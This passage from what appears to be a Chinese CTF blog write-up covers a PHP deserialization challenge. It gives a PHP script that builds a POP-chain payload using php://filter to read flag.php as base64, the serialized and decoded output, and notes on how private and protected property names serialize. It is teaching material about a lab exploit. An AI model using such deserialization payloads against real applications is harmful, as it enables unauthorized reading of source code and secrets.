<p>因此生成payload的php程序如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;<span class="comment">//获取源代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;source=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str=<span class="keyword">new</span> <span class="title class_">Test</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str-&gt;p=<span class="keyword">new</span> <span class="title class_">Modifier</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;source&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;source&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;str&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;Modifier&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot; * var&quot;</span>;s:<span class="number">57</span>:<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;&#125;&#125;&#125;s:<span class="number">3</span>:<span class="string">&quot;str&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>
<p>urlencode之后用get方法传进去得到base64加密密文</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFne2UzY2IyY2U2LTZlNzItNDVjNy1iY2FlLWRlMTk4YmM2ZjkzYX0iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8+</span><br></pre></td></tr></table></figure>
<p>解密之后得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>= <span class="string">&quot;flag&#123;e3cb2ce6-6e72-45c7-bcae-de198bc6f93a&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Help Me Find FLAG!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="坑1">坑1</h4>
<p>我一开始傻了吧唧的真用手去构造这个序列化字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;Showsource&quot;</span>;</span><br><span class="line">    O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;Showsource&quot;</span>:i:<span class="number">0</span>;</span><br><span class="line">        O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Tests&quot;</span>;</span><br><span class="line">            O:<span class="number">8</span>:<span class="string">&quot;Modifier&quot;</span>:<span class="number">1</span>&#123;s:<span class="number">11</span>:<span class="string">&quot;Modifiervar&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">s:<span class="number">7</span>:<span class="string">&quot;Showstr&quot;</span>;i:<span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;Showsource&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;Showsource&quot;</span>:i:<span class="number">0</span>;O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Tests&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;Modifier&quot;</span>:<span class="number">1</span>&#123;s:<span class="number">11</span>:<span class="string">&quot;Modifiervar&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>&#125;&#125;&#125;</span><br><span class="line">s:<span class="number">7</span>:<span class="string">&quot;Showstr&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>结果全错了,键名都不对,只有private修饰的键名才会前面附上类名,啥意思呢?</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$v1</span>=<span class="string">&quot;private&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$v2</span>=<span class="string">&quot;protected&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$v3</span>=<span class="string">&quot;default&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v4</span>=<span class="string">&quot;public&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Test</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Test&quot;:4:&#123;s:8:&quot;Testv1&quot;;s:7:&quot;private&quot;;s:5:&quot; * v2&quot;;s:9:&quot;protected&quot;;s:2:&quot;v3&quot;;s:7:&quot;default&quot;;s:2:&quot;v4&quot;;s:6:&quot;public&quot;;&#125;</span><br></pre></td></tr></table></figure>
<table>
<colgroup>
<col style="width: 13%" />
<col style="width: 9%" />
<col style="width: 18%" />
<col style="width: 59%" />
</colgroup>
<thead>
<tr>
<th>修饰符</th>
<th>原键名</th>
<th>序列化后键名</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>private</td>
<td><code>v1</code></td>
<td><code>Testv1</code></td>
<td>附上类名作为前缀</td>
</tr>
<tr>
<td>protected</td>
<td><code>v2</code></td>
<td><code>* v2</code></td>
<td>附上<code>*</code>前缀(注意星号左右各有一个空格)</td>
</tr>
<tr>
<td>缺省</td>
<td><code>v3</code></td>
<td><code>v3</code></td>
<td>不变</td>
</tr>
<tr>
<td>public</td>
<td><code>v4</code></td>
<td><code>v4</code></td>
<td>不变</td>
</tr>
</tbody>
</table>
<h4 id="坑2">坑2</h4>
<p>vscode调试控制台向外粘贴出错</p>
<p>vscode调试控制台输出的运行结果是这样的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220721032806113.png"
alt="image-20220721032806113" />
<figcaption aria-hidden="true">image-20220721032806113</figcaption>
</figure>
<p>对于 *
v2这种protected变量序列化后的键名,从调试控制台复制出去之后,星号两侧的空格消失</p>
<table>
<colgroup>
<col style="width: 23%" />
<col style="width: 76%" />
</colgroup>
<thead>
<tr>
<th>位置</th>
<th>表现</th>
</tr>
</thead>
<tbody>
<tr>
<td>调试控制台中的输出</td>
<td>O:4:"Test":4:{s:8:"Testv1";s:7:"private";s:5:" *
v2";s:9:"protected";s:2:"v3";s:7:"default";s:2:"v4";s:6:"public";}</td>
</tr>
<tr>
<td>粘贴出去的输出</td>
<td>O:4:"Test":4:{s:8:"Testv1";s:7:"private";s:5:"*v2";s:9:"protected";s:2:"v3";s:7:"default";s:2:"v4";s:6:"public";}</td>
</tr>
</tbody>
</table>
<p>解决方法是,直接让php输入urlencode之后的负载,这样所有的空格都会被转移,并且不用再去hackbar中urlencode了</p>
<p><code>echo urlencode(serialize($a));</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/impossible/page/6/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/impossible/">1</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/impossible/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/10/">10</a><a class="extend next" rel="next" href="/impossible/page/8/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="dustball"
      src="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
  <p class="site-author-name" itemprop="name">dustball</p>
  <div class="site-description" itemprop="description">dustland</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">39</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">dustball</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  
  <script data-pjax>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
<script src="/js/algolia-search.js"></script>












<script data-pjax>
if (document.querySelectorAll('pre.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
    mermaid.initialize({
      theme    : 'dark',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    });
  }, window.mermaid);
}
</script>


    <div id="pjax">
  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

    </div>
</body>
</html>
